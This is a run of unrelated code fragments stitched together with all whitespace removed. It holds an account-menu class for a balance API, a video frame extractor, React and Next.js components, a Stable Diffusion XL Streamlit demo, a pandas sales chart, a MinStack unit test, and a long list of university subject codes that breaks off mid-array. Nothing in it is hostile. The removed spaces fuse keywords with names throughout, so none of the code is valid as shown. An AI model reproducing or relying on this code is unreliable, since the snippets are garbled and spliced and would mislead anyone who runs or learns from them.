fresponseisnotNoneandresponse.headers['Content-Type']=='application/json'\and"Error"inresponse.json()and"message"inresponse.json()["Error"]\andresponse.json()["Error"]["message"]isnotNone:print("Error:"+response.json()["Error"]["message"])else:print("Error:BalanceAPIserviceerror")else:#Handleerrorslogger.debug("ResponseBody:%s",response.text)ifresponseisnotNoneandresponse.headers['Content-Type']=='application/json'\and"Error"inresponse.json()and"message"inresponse.json()["Error"]\andresponse.json()["Error"]["message"]isnotNone:print("Error:"+response.json()["Error"]["message"])else:print("Error:BalanceAPIserviceerror")defaccount_menu(self):"""Providesthedifferentoptionsforthesampleapplication:balance,portfolio,vieworders:paramself:Passinauthenticatedsessionandinformationonselectedaccount"""ifself.account["institutionType"]=="BROKERAGE":menu_items={"1":"Balance","2":"Portfolio","3":"Orders","4":"GoBack"}whileTrue:print("")options=menu_items.keys()forentryinoptions:print(entry+")\t"+menu_items[entry])selection=input("Pleaseselectanoption:")ifselection=="1":self.balance()elifselection=="2":self.portfolio()elifselection=="3":order=Order(self.session,self.account,self.base_url)order.view_orders()elifselection=="4":breakelse:print("UnknownOptionSelected!")elifself.account["institutionType"]=="BANK":menu_items={"1":"Balance","2":"GoBack"}whileTrue:print("\n")options=menu_items.keys()forentryinoptions:print(entry+")\t"+menu_items[entry])selection=input("Pleaseselectanoption:")ifselection=="1":self.balance()elifselection=="2":breakelse:print("UnknownOptionSelected!")else:menu_items={"1":"GoBack"}whileTrue:print("")options=menu_items.keys()forentryinoptions:print(entry+")\t"+menu_items[entry])selection=input("Pleaseselectanoption:")ifselection=="1":breakelse:print("UnknownOptionSelected!")importcv2importosimportshutil#Createorcleanupexistingextractedimageframesdirectory.FRAME_EXTRACTION_DIRECTORY='/content/frames'FRAME_PREFIX='_frame'video_file_name='Burglary004_x264.mp4'defcreate_frame_output_dir(output_dir):ifnot(os.path.exists(output_dir)):os.makedirs(output_dir)else:shutil.rmtree(output_dir)os.makedirs(output_dir)defextract_frame_from_video(video_file_path):print(f'Extracting{video_file_path}at1framepersecond.Thismighttakeabit...')create_frame_output_dir(FRAME_EXTRACTION_DIRECTORY)vidcap=cv2.VideoCapture(video_file_path)fps=vidcap.get(cv2.CAP_PROP_FPS)frame_duration=1/fps#Timeintervalbetweenframes(inseconds)output_file_prefix=os.path.basename(video_file_path).replace('.','_')frame_count=0count=0whilevidcap.isOpened():success,frame=vidcap.read()ifnot(success):#Endofvideobreakif(int(count/fps)==frame_count):#Extractaframeeverysecondmin=frame_count//60sec=frame_count%60time_string=f'{min:02d}:{sec:02d}'image_name=f'{output_file_prefix}{FRAME_PREFIX}{time_string}.jpg'output_filename=os.path.join(FRAME_EXTRACTION_DIRECTORY,image_name)cv2.imwrite(output_filename,frame)frame_count+=1count+=1vidcap.release()#Releasethecaptureobject\n',print(f'Completedvideoframeextraction!\n\nExtracted:{frame_count}frames')#extract_frame_from_video(video_file_name)import{Routes,Route}from'react-router-dom';importLayoutfrom'./components/Layout';importPublicfrom'./components/Public';importLoginfrom'./features/auth/Login';importGamesListfrom'./features/games/GamesList';functionApp(){return(<Routes><Routepath='/'element={<Layout/>}><Routeindexelement={<Public/>}/><Routepath='/login'element={<Login/>}/><Routepath='/games'><Routeindexelement={<GamesList/>}/></Route></Route></Routes>);}exportdefaultApp;frompytorch_lightningimportseed_everythingfromscripts.demo.streamlit_helpersimport*SAVE_PATH="outputs/demo/txt2img/"SD_XL_BASE_RATIOS={"0.5":(704,1408),"0.52":(704,1344),"0.57":(768,1344),"0.6":(768,1280),"0.68":(832,1216),"0.72":(832,1152),"0.78":(896,1152),"0.82":(896,1088),"0.88":(960,1088),"0.94":(960,1024),"1.0":(1024,1024),"1.07":(1024,960),"1.13":(1088,960),"1.21":(1088,896),"1.29":(1152,896),"1.38":(1152,832),"1.46":(1216,832),"1.67":(1280,768),"1.75":(1344,768),"1.91":(1344,704),"2.0":(1408,704),"2.09":(1472,704),"2.4":(1536,640),"2.5":(1600,640),"2.89":(1664,576),"3.0":(1728,576),}VERSION2SPECS={"SDXL-base-1.0":{"H":1024,"W":1024,"C":4,"f":8,"is_legacy":False,"config":"configs/inference/sd_xl_base.yaml","ckpt":"checkpoints/sd_xl_base_1.0.safetensors",},"SDXL-base-0.9":{"H":1024,"W":1024,"C":4,"f":8,"is_legacy":False,"config":"configs/inference/sd_xl_base.yaml","ckpt":"checkpoints/sd_xl_base_0.9.safetensors",},"SD-2.1":{"H":512,"W":512,"C":4,"f":8,"is_legacy":True,"config":"configs/inference/sd_2_1.yaml","ckpt":"checkpoints/v2-1_512-ema-pruned.safetensors",},"SD-2.1-768":{"H":768,"W":768,"C":4,"f":8,"is_legacy":True,"config":"configs/inference/sd_2_1_768.yaml","ckpt":"checkpoints/v2-1_768-ema-pruned.safetensors",},"SDXL-refiner-0.9":{"H":1024,"W":1024,"C":4,"f":8,"is_legacy":True,"config":"configs/inference/sd_xl_refiner.yaml","ckpt":"checkpoints/sd_xl_refiner_0.9.safetensors",},"SDXL-refiner-1.0":{"H":1024,"W":1024,"C":4,"f":8,"is_legacy":True,"config":"configs/inference/sd_xl_refiner.yaml","ckpt":"checkpoints/sd_xl_refiner_1.0.safetensors",},}defload_img(display=True,key=None,device="cuda"):image=get_interactive_image(key=key)ifimageisNone:returnNoneifdisplay:st.image(image)w,h=image.sizeprint(f"loadedinputimageofsize({w},{h})")width,height=map(lambdax:x-x%64,(w,h))#resizetointegermultipleof64image=image.resize((width,height))image=np.array(image.convert("RGB"))image=image[None].transpose(0,3,1,2)image=torch.from_numpy(image).to(dtype=torch.float32)/127.5-1.0returnimage.to(device)defrun_txt2img(state,version,version_dict,is_legacy=False,return_latents=False,filter=None,stage2strength=None,):ifversion.startswith("SDXL-base"):W,H=st.selectbox("Resolution:",list(SD_XL_BASE_RATIOS.values()),10)else:H=st.number_input("H",value=version_dict["H"],min_value=64,max_value=2048)W=st.number_input("W",value=version_dict["W"],min_value=64,max_value=2048)C=version_dict["C"]F=version_dict["f"]init_dict={"orig_width":W,"orig_height":H,"target_width":W,"target_height":H,}value_dict=init_embedder_options(get_unique_embedder_keys_from_conditioner(state["model"].conditioner),init_dict,prompt=prompt,negative_prompt=negative_prompt,)sampler,num_rows,num_cols=init_sampling(stage2strength=stage2strength)num_samples=num_rows*num_colsifst.button("Sample"):st.write(f"**ModelI:**{version}")out=do_sample(state["model"],sampler,value_dict,num_samples,H,W,C,F,force_uc_zero_embeddings=["txt"]ifnotis_legacyelse[],return_latents=return_latents,filter=filter,)returnoutdefrun_img2img(state,version_dict,is_legacy=False,return_latents=False,filter=None,stage2strength=None,):img=load_img()ifimgisNone:returnNoneH,W=img.shape[2],img.shape[3]init_dict={"orig_width":W,"orig_height":H,"target_width":W,"target_height":H,}value_dict=init_embedder_options(get_unique_embedder_keys_from_conditioner(state["model"].conditioner),init_dict,prompt=prompt,negative_prompt=negative_prompt,)strength=st.number_input("**Img2ImgStrength**",value=0.75,min_value=0.0,max_value=1.0)sampler,num_rows,num_cols=init_sampling(img2img_strength=strength,stage2strength=stage2strength,)num_samples=num_rows*num_colsifst.button("Sample"):out=do_img2img(repeat(img,"1...->n...",n=num_samples),state["model"],sampler,value_dict,num_samples,force_uc_zero_embeddings=["txt"]ifnotis_legacyelse[],return_latents=return_latents,filter=filter,)returnoutdefapply_refiner(input,state,sampler,num_samples,prompt,negative_prompt,filter=None,finish_denoising=False,):init_dict={"orig_width":input.shape[3]*8,"orig_height":input.shape[2]*8,"target_width":input.shape[3]*8,"target_height":input.shape[2]*8,}value_dict=init_dictvalue_dict["prompt"]=promptvalue_dict["negative_prompt"]=negative_promptvalue_dict["crop_coords_top"]=0value_dict["crop_coords_left"]=0value_dict["aesthetic_score"]=6.0value_dict["negative_aesthetic_score"]=2.5st.warning(f"refinerinputshape:{input.shape}")samples=do_img2img(input,state["model"],sampler,value_dict,num_samples,skip_encode=True,filter=filter,add_noise=notfinish_denoising,)returnsamplesif__name__=="__main__":st.title("StableDiffusion")version=st.selectbox("ModelVersion",list(VERSION2SPECS.keys()),0)version_dict=VERSION2SPECS[version]ifst.checkbox("LoadModel"):mode=st.radio("Mode",("txt2img","img2img"),0)else:mode="skip"st.write("__________________________")set_lowvram_mode(st.checkbox("Lowvrammode",True))ifversion.startswith("SDXL-base"):add_pipeline=st.checkbox("LoadSDXL-refiner?",False)st.write("__________________________")else:add_pipeline=Falseseed=st.sidebar.number_input("seed",value=42,min_value=0,max_value=int(1e9))seed_everything(seed)save_locally,save_path=init_save_locally(os.path.join(SAVE_PATH,version))ifmode!="skip":state=init_st(version_dict,load_filter=True)ifstate["msg"]:st.info(state["msg"])model=state["model"]is_legacy=version_dict["is_legacy"]prompt=st.text_input("prompt","Astronautinajungle,coldcolorpalette,mutedcolors,detailed,8k",)ifis_legacy:negative_prompt=st.text_input("negativeprompt","")else:negative_prompt=""#whichisunusedstage2strength=Nonefinish_denoising=Falseifadd_pipeline:st.write("__________________________")version2=st.selectbox("Refiner:",["SDXL-refiner-1.0","SDXL-refiner-0.9"])st.warning(f"Runningwith{version2}asthesecondstagemodel.Makesuretoprovide(V)RAM:)")st.write("**RefinerOptions:**")version_dict2=VERSION2SPECS[version2]state2=init_st(version_dict2,load_filter=False)st.info(state2["msg"])stage2strength=st.number_input("**Refinementstrength**",value=0.15,min_value=0.0,max_value=1.0)sampler2,*_=init_sampling(key=2,img2img_strength=stage2strength,specify_num_samples=False,)st.write("__________________________")finish_denoising=st.checkbox("Finishdenoisingwithrefiner.",True)ifnotfinish_denoising:stage2strength=Noneifmode=="txt2img":out=run_txt2img(state,version,version_dict,is_legacy=is_legacy,return_latents=add_pipeline,filter=state.get("filter"),stage2strength=stage2strength,)elifmode=="img2img":out=run_img2img(state,version_dict,is_legacy=is_legacy,return_latents=add_pipeline,filter=state.get("filter"),stage2strength=stage2strength,)elifmode=="skip":out=Noneelse:raiseValueError(f"unknownmode{mode}")ifisinstance(out,(tuple,list)):samples,samples_z=outelse:samples=outsamples_z=Noneifadd_pipelineandsamples_zisnotNone:st.write("**RunningRefinementStage**")samples=apply_refiner(samples_z,state2,sampler2,samples_z.shape[0],prompt=prompt,negative_prompt=negative_promptifis_legacyelse"",filter=state.get("filter"),finish_denoising=finish_denoising,)ifsave_locallyandsamplesisnotNone:perform_save_locally(save_path,samples)importImagefrom'next/image';constFeatureCard=({title,description,image})=>{return(<divclassName='flexflex-colitems-centerjustify-centerp-5'><ImageclassName='w-autoobject-contain'src={image}alt={title}height={1920}width={1080}style={{height:'200px',width:'auto'}}/><h2className='text-xlfont-semiboldm-2'>{title}</h2><pclassName='text-mdtext-gray-600m-2'>{description}</p></div>);};exportdefaultFeatureCard;importpandasaspdimportmatplotlib.pyplotaspltclassVisualize:def__init__(self,data:pd.DataFrame,velocity:pd.DataFrame):self.data=datadefTopStoresOrdersOverTimeStackedAreaGraph(self,n:int):#Filtertoincludeonlythetopnstorestop_stores=self.data.groupby('Distributor')['SOQuantity'].sum().sort_values(ascending=False).head(n).indextop_df=self.data[self.data['Distributor'].isin(top_stores)]#Ensure'Date'columnisindatetimeformattop_df['Date']=pd.to_datetime(top_df['Date'])top_df['Week']=top_df['Date'].dt.isocalendar().week#Createadataframeforthe"Other"storesother_df=self.data[~self.data['Distributor'].isin(top_stores)]other_df['Date']=pd.to_datetime(other_df['Date'])other_df['Week']=other_df['Date'].dt.isocalendar().weekother_grouped=other_df.groupby(['Week'])['SOQuantity'].sum().reset_index()other_grouped['Distributor']='Other'#Groupthetopstoresdatagrouped=top_df.groupby(['Week','Distributor'])['SOQuantity'].sum().reset_index()#Combinethetopstoresdatawiththe"Other"datacombined=pd.concat([grouped,other_grouped],ignore_index=True)#Pivotthecombineddatapivot=combined.pivot(index='Week',columns='Distributor',values='SOQuantity').fillna(0)#Increasefiguresizeforbetterspacingplt.figure(figsize=(12,8))pivot.plot(kind='area',stacked=True,ax=plt.gca())plt.title('TopStoresOrdersOverTime')plt.ylabel('TotalSOQuantity')plt.xlabel('Week')#Movelegendbelowthegraphplt.legend(title='Distributor',bbox_to_anchor=(0.5,-0.2),loc='uppercenter',ncol=2)plt.tight_layout()plt.show()defTopStoresPieChart(self,n:int):pass#Loaddatadata=pd.read_csv('/mnt/data/data.csv')velocity=pd.read_csv('/mnt/data/velocity.csv')#Convert'Date'columntodatetimedata['Date']=pd.to_datetime(data['Date'])#InitializeVisualizeclassandgenerategraphvisualize=Visualize(data,velocity)visualize.TopStoresOrdersOverTimeStackedAreaGraph(5)importunittestfromcollectionsimportdequeclassMinStack:def__init__(self)->None:self.smallest=deque()self.stack=deque()def__repr__(self)->str:returnstr(self.stack)defpush(self,val:int)->None:self.stack.append(val)self.smallest.append(min(val,self.smallest[-1])ifself.smallestelseval)defpop(self)->None:self.smallest.pop()self.stack.pop()deftop(self)->int:returnself.stack[-1]defgetMin(self)->int:returnself.smallest[-1]classTestMinStack(unittest.TestCase):deftest_min_stack(self):min_stack=MinStack()min_stack.push(-2)min_stack.push(0)min_stack.push(-3)self.assertEqual(min_stack.getMin(),-3)min_stack.pop()self.assertEqual(min_stack.top(),0)self.assertEqual(min_stack.getMin(),-2)unittest.main()constSearch=()=>{return<divclassName='bg-black'>SearchPage</div>;};exportdefaultSearch;constsubjects=['MUSIC','NUCENG','ENGIN','GWS','POLSCI','UGBA','MECENG','SLAVIC','MUSIC','INTEGBI','GEOG','MATH','INTEGBI','MBA','AFRICAM','PHILOS','ARCH','EWMBA','LINGUIS','BIOENG','ENGIN','EPS','ESPM','FRENCH','NEU','SLAVIC','JAPAN','COMLIT','HISTORY','EDUC','LDARCH','XMBA','RELIGST','MECENG','POLSCI','ARABIC','URDU','KOREAN','ENVECON','PBHLTH','AFRICAM','ENGLISH','HISTORY','LINGUIS','SOCWEL','LEGALST','LDARCH','INTEGBI','UGIS','MUSIC','MEDIAST','POLSCI','THEATER','ASTRON','DESINV','HISTORY','ESPM','BIOENG','HISTART','HISTORY','SOCIOL','PSYCH','ITALIAN','GEOG','PBHLTH','PHILOS','HISTART','PUBPOL','LDARCH','ESPM','MBA','ENGIN','CHEM','THEATER','CELTIC','ANTHRO','FILM','LS','DESINV','ASTRON','CHEM','COGSCI','PHDBA','ESPM','EWMBA','MCELLBI','ESPM','EWMBA','ESPM','ISF','COLWRIT','HISTORY','EPS','XMUSIC','MECENG','ITALIAN','GWS','EWMBA','PACS','ART','OPTOM','GERMAN','INTEGBI','ENGIN','CDSS','DATA','THEATER','BUDDSTD','ENGLISH','COLWRIT','XMBA','INDENG','JOURN','EDUC','BIOENG','INDENG','PLANTBI','HUM','CIVENG','AFRICAM','MATSCI','BIOENG','INDENG','MECENG','ARCH','CHMENG','DESINV','GERMAN','EPS','NUSCTX','SOCWEL','ARCH','CHINESE','SPANISH','SASIAN','PBHLTH','UGBA','GWS','MATH','GERMAN','HISTORY','ENGIN','PHDBA','CELTIC','STAT','GERMAN','MCELLBI','LS','PBHLTH','MECENG','FRENCH','VISSTD','FRENCH','EPS','SSEASN','GWS','ESPM','MCELLBI','HISTORY','NATAMST','ARCH','JAPAN','CHEM','MFE','CPH','PHDBA','MUSIC','SOCIOL','STAT','MATH','STAT','JOURN','LDARCH','POLECON','ANTHRO','TURKISH','EPS','NUSCTX','SSEASN','POLSCI','SOCIOL','UGBA','ENGIN','AFRICAM','ASAMST','EWMBA','HEBREW','ECON','ASAMST','ITALIAN','COMPSS','ARCH','RHETOR','ARABIC','PBHLTH','SSEASN','COLWRIT','LDARCH','EDUC','EWMBA','PACS','SOCIOL','LINGUIS','HISTORY','COLWRIT','LINGUIS','ANTHRO','CHMENG','ENVDES','FILM','AFRICAM','EDUC','HISTORY','RDEV','DATA','ANTHRO','CIVENG','MUSIC','PSYCH','AGRS','ELENG','BIOENG','MECENG','MCELLBI','PBHLTH','DEMOG','MFE','MUSIC','CYPLAN','HISTORY','JOURN','SOCWEL','UGIS','HISTART','INTEGBI','MECENG','PHILOS','NWMEDIA','POLSCI','AFRICAM','DATASCI','ASTRON','CYBER','JEWISH','ANTHRO','CYPLAN','JOURN','OPTOM','JAPAN','HEBREW','SLAVIC','SOCWEL','ARCH','BIOENG','MECENG','GERMAN','MCELLBI','PBHLTH','MELC','MCELLBI','MATH','CHICANO','LINGUIS','COMLIT','POLSCI','ARCH','ITALIAN','MBA','TIBETAN','UGBA','KOREAN','MCELLBI','ANTHRO','ENGLISH','SOCIOL','ANTHRO','LEGALST','ARCH','MATH','ARABIC','CHICANO','ENGLISH','JEWISH','MBA','PBHLTH','PBHLTH','ENERES','ENGLISH','EWMBA','HISTART','RHETOR','SOCIOL','EDUC','THEATER','GEOG','PHYSED','MATH','EDUC','MECENG','OPTOM','PSYCH','PUBPOL','SCANDIN','MECENG','SOCIOL','CHEM','CYPLAN','AGRS','LEGALST','MATH','PHYSICS','SPANISH','LINGUIS','PLANTBI','ELENG','GLOBAL','ESPM','SOCWEL','INDENG','RUSSIAN','AFRICAM','GERMAN','PHYSICS','SOCWEL','GEOG','MELC','CIVENG','SPANISH','LS','GEOG','ESPM','PSYCH','ENVECON','THEATER','UGIS','AFRICAM','PHYSICS','DESINV','LEGALST','MELC','ANTHRO','LINGUIS','STAT','PSYCH','XAFRICA','PBHLTH','CHINESE','MECENG','GEOG','JOURN','MFE','POLSCI','ENVDES','CHMENG','MBA','ELENG','RHETOR','MCELLBI','COMLIT','BIOENG','ANTHRO','SCANDIN','AGRS','JOURN','ECON','AFRICAM','BIOENG','LDARCH','PHYSICS','MELC','PBHLTH','GREEK','ARABIC','JAPAN','COLWRIT','GERMAN','FRENCH','ENGIN','CYPLAN','LDARCH','ARCH','ANTHRO','COGSCI','COGSCI','LINGUIS','FRENCH','MBA','NUSCTX','DESINV','PSYCH','CHEM','NORWEGN','PSYCH','HISTORY','POLSCI','KOREAN','EPS','OPTOM','XAMRSTD','HISTORY','XMBA','MELC','COLWRIT','ENVDES','ENVDES','PHYSED','PHDBA','PHYSICS','CHICANO','CHMENG','PBHLTH','POLSCI','XHISTAR','MECENG','ITALIAN','FRENCH','COLWRIT','SEMITIC','COMLIT','CHINESE','DEVP','CHEM','ITALIAN','MBA','BIOENG','CLASSIC','CHINESE','ENVDES','POLSCI','ARCH','ANTHRO','LATIN','GERMAN','MECENG','PSYCH','THEATER','HISTORY','ENGLISH','MATH','CHEM','MECENG','ENGIN','NEU','INTEGBI','SOCIOL','SOCWEL','CIVENG','COMLIT','HUM','ARCH','ENERES','AGRS','MATSCI','BIOENG','CHMENG','PBHLTH','CHINESE','STAT','XPHILOS','PHILOS','CUNEIF','MCELLBI','SLAVIC','JAPAN','FILM','LGBT','ANTHRO','GERMAN','LS','POLSCI','EDUC','NATAMST','NUSCTX','HISTART','MCELLBI','LINGUIS','ART','ENGIN','GEOG','HISTORY','LINGUIS','MATH','OPTOM','EDUC','ENGLISH','HISTORY','MUSIC','MUSIC','PSYCH','AFRICAM','ECON','ENGLISH','COLWRIT','MEDIAST','GEOG','OPTOM','POLSCI','ARESEC','SLAVIC','SPANISH','SLAVIC','MCELLBI','EWMBA','LEGALST','ECON','ENGIN','LINGUIS','SOCIOL','ESPM','NUSCTX','SPANISH','ARCH','NATAMST','LDARCH','HISTORY','HISTART','ICELAND','LDARCH','SSEASN','PHYSICS','POLSCI','CLASSIC','ECON','EWMBA','PHYSICS','MONGOLN','AGRS','ANTHRO','ESPM','ANTHRO','ECON','HISTART','HEBREW','XMBA','ESPM','HISTART','NATAMST','ARMENI','VISSCI','ARCH','MECENG','MCELLBI','CRITTH','INDENG','MESTU','MBA','COLWRIT','EDUC','ENGLISH','VISSTD','EDUC','EDUC','EDUC','LS','HISTORY','NUCENG','ENGIN','MUSIC','RHETOR','SSEASN','ISF','EECS','ENERES','MBA','NUSCTX','ELENG','LINGUIS','OPTOM','MCELLBI','CHEM','HISTORY','PLANTBI','SASIAN','THEATER','GEOG','ENERES','XANTHRO','MATH','BIOENG','MECENG','ANTHRO','CYPLAN','EALANG','POLSCI','EDUC','SASIAN','PBHLTH','XMBA','CHINESE','EWMBA','XPOLSCI','POLSCI','FILM','ANTHRO','GEOG','AFRICAM','NUSCTX','MCELLBI','MUSIC','ARABIC','SOCWEL','EDUC','CIVENG','PHYSICS','ANTHRO','MCELLBI','CRWRIT','GERMAN','HEBREW','MUSIC','STAT','MEDIAST','HISTART','MELC','POLECON','MECENG','RELIGST','THEATER','THEATER','EDUC','MUSIC','PBHLTH','LINGUIS','ANTHRO','MATH','EGYPT','MECENG','MEDIAST','MCELLBI','CIVENG','PBHLTH','MPS','EWMBA','HISTART','MCELLBI','PSYCH','EWMBA','SANSKR','LDARCH','ETHSTD','ENVECON','LINGUIS','CHINESE','MATH','MELC','DEMOG','CHEM','JAPAN','ARCH','ECON','COLWRIT','CHINESE','ENGIN','FRENCH','EALANG','HISTART','HISTORY','COLWRIT','PHDBA','INTEGBI','MATH','NUCENG','EDUC','ECON','ASAMST','CHEM','ARCH','ENVDES','INTEGBI','PACS','ENGIN','RHETOR','AEROSPC','HEBREW','DUTCH','AFRICAM','XGEOG','CIVENG','HISTART','ESPM','OPTOM','PHDBA','RHETOR','LEGALST','THEATER','EDUC','INDENG','MATH','PSYCH','SOCWEL','TURKISH','EDSTEM','INDONES','EWMBA','INTEGBI','UGIS','COMPSCI','XMBA','UGIS','INDENG','SOCIOL','ENGLISH','PBHLTH','BIOENG','PSYCH','INTEGBI','NATAMST','FRENCH','MATH','MUSIC','MEDIAST','ANTHRO','CLASSIC','HISTORY','ILA','ENGLISH','INTEGBI','JOURN','UGIS','VIETNMS','HISTORY','CYPLAN','ENGIN','XMBA','ITALIAN','SOCIOL','HISTART','NWMEDIA','EWMBA','MCELLBI','ANTHRO','MBA','MELC','PLANTBI','PSYCH','ETHSTD','COMPSCI','PSYCH','XMBA','THEATER','HISTORY','JAPAN','FRENCH','POLSCI','NUSCTX','ELENG','LGBT','UGIS','COLWRIT','BIOENG','ETHSTD','GSPDP','EDUC','COLWRIT','ISF','ENGLISH','EDUC','ESPM','SOCIOL','SOCIOL','ETHSTD','UGBA','EWMBA','FRENCH','AGRS','POLSCI','SSEASN','PBHLTH','JOURN','POLECON','ESPM','ANTHRO','INTEGBI','UGBA','PBHLTH','MELC','SLAVIC','COMPSS','MCELLBI','SLAVIC','LINGUIS','ENGLISH','RHETOR','UGBA','ECON','MEDIAST','ENGLISH','JOURN','MBA','PHDBA','PHILOS','ENGIN','IRANIAN','CYPLAN','LATAMST','HISTART','MCELLBI','ANTHRO','THEATER','ESPM','ENGLISH','ENGLISH','OPTOM','CLASSIC','GEOG','PBHLTH','ESPM','HEBREW','LEGALST','PSYCH','RHETOR','HISTORY','MUSIC','AFRICAM','LDARCH','SOCIOL','SOCIOL','JOURN','ITALIAN','AMERSTD','CIVENG','ENGLISH','INTEGBI','EECS','PBHLTH','GEOG','ARCH','MATH','MELC','VIETNMS','SLAVIC','CHMENG','FRENCH','SOCIOL','EDUCSPE','POLSCI','ENGIN','ESPM','PSYCH','CIVENG','ASAMST','COLWRIT','EGYPT','FILIPN','COLWRIT','MATH','PHILOS','POLSCI','POLSCI','ENGLISH','FILIPN','PSYCH','MELC','THEATER','AMERSTD','PBHLTH','FILM','GEOG','EPS','GLOBAL','MATSCI','EDUC','EECS','EDUC','SOCWEL','LINGUIS','CHEM','PBHLTH','POLSCI','MECENG','AGRS','GEOG','ARMENI','EDUC','MBA','ENVDES','SOCIOL','ARCH','ELENG','PHDBA','ENGIN','PUBPOL','ESPM','MBA','LINGUIS','INTEGBI','LINGUIS','THEATER','ASAMST','CHMENG','ASAMST','FILM','EDSTEM','ENGIN','MATH','PHDBA','ELENG','JOURN','UGBA','XMATH','MUSIC','INTEGBI','ANTHRO','LS','MECENG','ECON','SSEASN','LEGALST','INTEGBI','GLOBAL','MEDST','FILM','GEOG','ANTHRO','ENERES','CUNEIF','BOSCRSR','MELC','MBA','ANTHRO','MBA','RHETOR','CHMENG','CHINESE','GEOG','EALANG','EDUC','MATSCI','ENGLISH','MELC','CHINESE','HISTORY','ARCH','CIVENG','ANTHRO','EALANG','TURKISH','MFE','AFRICAM','JOURN','CHINESE','COLWRIT','AFRICAM','NUCENG','HISTART','POLECON','POLSCI','PLANTBI','CIVENG','KOREAN','COMLIT','MBA','OPTOM','EPS','CLASSIC','JAPAN','CMPBIO','BIOENG','HISTORY','POLECON','LINGUIS','NUCENG','SOCWEL','SLAVIC','PACS','CHMENG','JEWISH','CHINESE','HISTART','SOCWEL','UGBA','HISTORY','MBA','PSYCH','XRHETOR','ARESEC','ARCH','DATASCI','CHEM','EWMBA','HISTORY','SOCWEL','EDUC','ARESEC','PUBPOL','MBA','MCELLBI','ENGIN','BUDDSTD','ESPM','SCANDIN','ELENG','STAT','ARCH','HISTORY','ETHSTD','GERMAN','HINDI','LATIN','JOURN','POLSCI','POLSCI','SOCIOL','JOURN','SLAVIC','HISTART','SOCIOL','GWS','CYPLAN','RHETOR','GWS','SOCIOL','RHETOR','MCELLBI','GEOG','ARCH','SSEASN','EDUC','NATAMST','ENVECON','PUBPOL','JAPAN','MBA','CIVENG','IRANIAN','EGYPT','MONGOLN','XHISTAR','UGIS','PERSIAN','POLSCI','HISTORY','GERMAN','AEROSPC','EDUC','COMPSS','NATAMST','KOREAN','HISTORY','ASAMST','ECON','SASIAN','MCELLBI','LS','ELENG','LINGUIS','GWS','UGBA','RHETOR','ARCH','HISTORY','MUSIC','ESPM','EDUC','EDUC','EDUC','PBHLTH','AFRICAM','MBA','MATH','INDONES','STAT','AMERSTD','FILM','HISTORY','ASTRON','CIVENG','COMPSCI','POLSCI','UGBA','THEATER','COLWRIT','CHMENG','ELENG','ANTHRO','COMPSCI','RUSSIAN','ESPM','ITALIAN','EPS','ANTHRO','MBA','ANTHRO','ISF','AFRICAM','PHILOS','FILM','POLSCI','ASAMST','UGBA','ANTHRO','SOCWEL','COLWRIT','MBA','AMERSTD','LINGUIS','AGRS','HISTORY','POLSCI','STAT','PBHLTH','LEGALST','ENGLISH','SLAVIC','MECENG','CHINESE','LEGALST','ANTHRO','PBHLTH','BIOENG','ESPM','POLSCI','ARCH','EDUC','LATIN','COLWRIT','FILM','GEOG','HISTORY','LINGUIS','ECON','PHDBA','POLSCI','MATH','HMEDSCI','ESPM','PSYCH','PSYCH','SOCIOL','SLAVIC','SOCWEL','OPTOM','POLSCI','GPP','ARCH','INDENG','EDUC','DIGHUM','CYPLAN','EDUC','ENGLISH','GWS','MECENG','INTEGBI','SOCWEL','NEU','HISTART','CIVENG','CLASSIC','XMATH','CHINESE','NUSCTX','FRENCH','ASAMST','MUSIC','SPANISH','PBHLTH','MECENG','POLSCI','IAS','MELC','AMERSTD','ECON','INTEGBI','NWMEDIA','GERMAN','FRENCH','PBHLTH','PSYCH','HISTART','PUBPOL','LEGALST','PHYSICS','GERMAN','EDUC','ENGLISH','PSYCH','SEMITIC','NUCENG','MCELLBI','MCELLBI','COLWRIT','PSYCH','HISTORY','PERSIAN','MCELLBI','GERMAN','ARCH','ITALIAN','MBA','PHYSED','EALANG','PHYSICS','INDENG','ARCH','ESPM','KOREAN','ASAMST','DESINV','MBA','ANTHRO','PHYSICS','POLSCI','DEVP','RHETOR','DUTCH','MBA','THEATER','SOCWEL','EDUC','CIVENG','LEGALST','CHEM','BIOENG','INDENG','MECENG','ENGLISH','MBA','MCELLBI','RUSSIAN','INDENG','NUCENG','ENGIN','COMLIT','NUSCTX','ARCH','ECON','NATAMST','CHINESE','MUSIC','TURKISH','XASAMST','GWS','ENGIN','RHETOR','ESPM','COLWRIT','EPS','ARCH','ECON','GREEK','ITALIAN','MCELLBI','PHILOS','UGIS','INTEGBI','POLSCI','NUSCTX','OPTOM','HISTART','GERMAN','INDENG','MESTU','XMBA','AGRS','ENGLISH','EWMBA','EDUC','CHEM','ART','MCELLBI','CELTIC','COLWRIT','INTEGBI','OPTOM','INTEGBI','SLAVIC','JOURN','MELC','LDARCH','POLSCI','INTEGBI','PHILOS','ARCH','CIVENG','HISTART','LS','PUBPOL','HISTORY','RHETOR','HISTART','LINGUIS','ARCH','COLWRIT','PBHLTH','PBHLTH','NEU','MELC','ANTHRO','ESPM','LEGALST','UGBA','ESPM','HEBREW','ANTHRO','CIVENG','ENGLISH','ASTRON','ANTHRO','MUSIC','POLSCI','EDUC','ENGLISH','NATRES','EDUC','LINGUIS','MCELLBI','EDUC','SASIAN','COMLIT','ANTHRO','NAVSCI','UGBA','SOCWEL','EDUC','JOURN','MELC','HINDI','PBHLTH','ESPM','INFO','PHYSICS','SLAVIC','IAS','NUCENG','LINGUIS','POLSCI','AGRS','ECON','KOREAN','LEGALST','ESPM','THEATER','LINGUIS','NEU','PHDBA','MCELLBI','MBA','MCELLBI','CHEM','GSPDP','EDUC','FRENCH','ANTHRO','LS','LDARCH','BIOPHY','LINGUIS','MECENG','ENGIN','MELC','COGSCI','OPTOM','MCELLBI','MUSIC','ENVDES','PBHLTH','ECON','POLSCI','PUBPOL','AMERSTD','CHEM','SOCIOL','LDARCH','CHEM','EDUC','MFE','PORTUG','HISTART','RHETOR','SPANISH','MBA','MUSIC','EDUC','LINGUIS','MELC','PBHLTH','PUBPOL','ENVDES','EWMBA','GWS','ARMENI','EDUC','CZECH','MUSIC','EDUC','OPTOM','HISTORY','CIVENG','FILM','EGYPT','ESPM','ITALIAN','ESPM','PERSIAN','STAT','CUNEIF','MCELLBI','PBHLTH','PUBAFF','AEROENG','MCELLBI','GEOG','SPANISH','ARCH','CIVENG','EDUC','CHICANO','ENERES','MUSIC','THEATER','UGBA','ESPM','PBHLTH','SSEASN','PSYCH','HISTART','GEOG','MBA','STAT','SSEASN','NWMEDIA','ENGLISH','UGBA','SSEASN','CHICANO','DIGHUM','JAPAN','CYPLAN','ENGIN','ENVECON','XMBA','